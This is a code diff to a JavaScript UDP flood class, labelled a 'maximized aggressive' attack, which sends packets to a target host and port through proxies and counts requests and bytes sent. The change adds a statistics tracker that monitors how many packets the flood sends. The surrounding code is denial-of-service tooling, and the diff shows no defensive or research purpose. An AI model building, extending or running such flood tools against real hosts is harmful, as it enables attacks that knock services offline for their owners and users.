@@ -2,6 +2,7 @@ import dgram from 'dgram';
 import { Tools } from '../../utils/tools.js';
 import { logger } from '../../utils/logger.js';
 import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
+import { StatsTracker } from '../../utils/stats-tracker.js';
 
 /**
  * UDP Flood Attack - MAXIMIZED AGGRESSIVE VERSION
@@ -13,6 +14,10 @@ export class UDPFlood {
         this.duration = duration;
         this.proxies = proxies;
         this.active = true;
+        
+        // Stats tracking for monitor
+        this.statsTracker = new StatsTracker();
+        this.stats = this.statsTracker.stats;
     }
 
     async start() {
@@ -72,6 +77,7 @@ export class UDPFlood {
                                 Tools.sendTo(socket, payload, this.port, this.target);
                                 REQUESTS_SENT.add(1);
                                 BYTES_SENT.add(payloadSize);
+                                this.statsTracker.addRequest(true, payloadSize);
                                 packetsSent++;
                             } catch (err) {
                                 // Continue on individual packet error
